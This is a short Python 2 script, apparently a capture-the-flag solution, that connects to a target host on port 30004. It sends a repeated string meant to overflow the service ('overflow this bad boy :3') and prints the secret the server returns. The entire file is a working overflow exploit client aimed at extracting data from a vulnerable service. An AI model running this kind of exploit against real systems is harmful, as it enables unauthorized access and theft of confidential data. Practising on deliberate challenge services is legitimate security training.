import socket
import sys
import pickle
import binascii

HOST, PORT = sys.argv[1], 30004

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to server and send data
    sock.connect((HOST, PORT))
    
    # overflow this bad boy :3
    data = ('%x' % ord('A')) * 64
    sock.send(data)
    
    received = sock.recv(1024)
    print received[len('This is my secret: '):]
    
finally:
    sock.close()
